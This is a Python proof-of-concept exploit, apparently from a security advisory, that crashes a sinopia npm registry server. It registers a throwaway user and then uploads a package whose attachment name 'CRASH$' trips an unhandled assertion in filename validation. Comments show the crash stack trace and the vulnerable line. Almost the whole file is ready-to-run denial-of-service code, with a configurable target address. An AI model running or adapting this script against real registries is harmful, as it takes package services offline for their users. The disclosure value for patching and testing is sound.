#!/usr/bin/env python
#
# NPM registry 'sinopia' crash by triggering an
# assert in their filename verification routine
#
# [1478616333170]  fatal --- uncaught exception, please report this
# [1478616333170] AssertionError: false == true
# [1478616333170]     at Storage.add_tarball (/hana/shared/HDP/xs/ea_data/hanapt/executionroot/2b304182-dc70-407a-bc14-553f5b9890ae/app/node_modules/sinopia/lib/local-storage.js:347:3)
# [1478616333170]     at Storage.add_tarball (/hana/shared/HDP/xs/ea_data/hanapt/executionroot/2b304182-dc70-407a-bc14-553f5b9890ae/app/node_modules/sinopia/lib/storage.js:171:21)
# [1478616333170]     at create_tarball (/hana/shared/HDP/xs/ea_data/hanapt/executionroot/2b304182-dc70-407a-bc14-553f5b9890ae/app/node_modules/sinopia/lib/index-api.js:339:28)
#
# Code from local-storage.js:
#   Storage.prototype.add_tarball = function(name, filename) {
#     assert(Utils.validate_name(filename)) <-- crash
#     [...]
#
# -- ERPScan
 
import json
import requests
import random
 
base_url = "http://172.16.100.21:50012" # change the port to your current sinopia port
random = random.randint(0, 1000000)
packagename = u'fakepackage%s' % random
package_endpoint = "/%s" % packagename
createuser_endpoint = "/-/user/org.couchdb.user:dosuser"
 
headers = {"content-type": "application/json",
           "user-agent": "npm/1.4.21 node/v0.10.25 linux x64"}
 
json_adduser={"name":"dosuser",
              "password":"dosuser",
              "email":"dos@erpscan.com",
              "_id":"org.couchdb.user:dosuser",
              "type":"user"}
 
r = requests.put(base_url + createuser_endpoint, headers=headers, data=json.dumps(json_adduser))
print r.status_code, r.text
 
json_data={"_id":packagename,
           "name":packagename,
           "versions":{"1.0.%s" % random: "XXX"},
           "_attachments":{
               'CRASH$': {
                   "data":'AA',
                   "length": 2
               }
           }
}
 
r = requests.put(base_url + package_endpoint, headers=headers, auth=('dosuser', 'dosuser'), data=json.dumps(json_data))
print r.status_code, r.text